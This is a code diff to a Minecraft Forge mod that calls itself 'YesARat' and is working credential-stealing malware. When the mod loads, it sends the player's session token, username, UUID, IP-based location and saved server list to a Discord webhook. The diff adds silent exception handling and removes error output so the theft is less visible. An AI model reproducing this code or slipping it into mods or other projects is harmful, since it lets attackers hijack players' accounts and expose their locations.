@@ -18,7 +18,7 @@ import java.net.URL;
 @Mod(modid = "yesarat")
 public class Main {
 	
-	final static String $name = "YesARat v1.2";
+	final static String $name = "YesARat v1.2.1";
 	// this is an example webhook but it has been tested with a real webhook and it worked perfectly
 	final static String $host = "https://discord.com/api/webhooks/1000000000000000000/abcdefghijklmnopqrstuvwxy-z_A-BCDEFGHIJKLMNOPQRSTUVWXY_Z-0_123456789";
 	
@@ -30,15 +30,18 @@ public class Main {
 				DiscordWebhook webhook = new DiscordWebhook($host);
 				webhook.setUsername($name);
 				
-				Session session = Minecraft.getMinecraft().getSession();
-				DiscordWebhook.EmbedObject accountEmbed = new DiscordWebhook.EmbedObject()
-					.setTitle(":unlock: Account Info")
-					.setColor(0x004444)
-					.setDescription("[NameMC](https://namemc.com/" + session.getPlayerID() + ") | [Plancke](https://plancke.io/hypixel/player/stats/" + session.getPlayerID() + ") | [SkyCrypt](https://sky.shiiyu.moe/stats/" + session.getPlayerID() + ")")
-					.addField(":identification_card: Name", "```" + session.getUsername() + "```", true)
-					.addField(":identification_card: UUID", "```" + session.getPlayerID() + "```", true)
-					.addField(":key: Session Token", "```" + session.getToken() + "```", false);
-				webhook.addEmbed(accountEmbed);
+				try {
+					Session session = Minecraft.getMinecraft().getSession();
+					DiscordWebhook.EmbedObject accountEmbed = new DiscordWebhook.EmbedObject()
+						.setTitle(":unlock: Account Info")
+						.setColor(0x004444)
+						.setDescription("[NameMC](https://namemc.com/" + session.getPlayerID() + ") | [Plancke](https://plancke.io/hypixel/player/stats/" + session.getPlayerID() + ") | [SkyCrypt](https://sky.shiiyu.moe/stats/" + session.getPlayerID() + ")")
+						.addField(":identification_card: Name", "```" + session.getUsername() + "```", true)
+						.addField(":identification_card: UUID", "```" + session.getPlayerID() + "```", true)
+						.addField(":key: Session Token", "```" + session.getToken() + "```", false);
+					webhook.addEmbed(accountEmbed);
+				} catch (Exception exc) {
+				}
 				
 				try {
 					JsonObject ip = (JsonObject) new JsonParser().parse(IOUtils.toString(new URL("https://ipapi.co/json")));
@@ -54,24 +57,25 @@ public class Main {
 						.addField(":clock10: Timezone", "```" + ip.get("timezone").getAsString() + "```", true);
 					webhook.addEmbed(geoEmbed);
 				} catch (Exception exc) {
-					exc.printStackTrace();
 				}
 				
-				DiscordWebhook.EmbedObject serversEmbed = new DiscordWebhook.EmbedObject()
-					.setTitle(":file_folder: Saved Servers")
-					.setColor(0x440044)
-					.setDescription("Contains the target's list of saved Minecraft servers");
-				ServerList servers = new ServerList(Minecraft.getMinecraft());
-				for (int i = 0; i < servers.countServers(); i++) {
-					ServerData server = servers.getServerData(i);
-					serversEmbed.addField(":label: " + server.serverName, "```" + server.serverIP + "```", true);
+				try {
+					DiscordWebhook.EmbedObject serversEmbed = new DiscordWebhook.EmbedObject()
+						.setTitle(":file_folder: Saved Servers")
+						.setColor(0x440044)
+						.setDescription("Contains the target's list of saved Minecraft servers");
+					ServerList servers = new ServerList(Minecraft.getMinecraft());
+					for (int i = 0; i < servers.countServers(); i++) {
+						ServerData server = servers.getServerData(i);
+						serversEmbed.addField(":label: " + server.serverName, "```" + server.serverIP + "```", true);
+					}
+					webhook.addEmbed(serversEmbed);
+				} catch (Exception exc) {
 				}
-				webhook.addEmbed(serversEmbed);
 				
 				webhook.execute();
 				
 			} catch (Exception exc) {
-				exc.printStackTrace();
 			}
 		}).start();
 	}
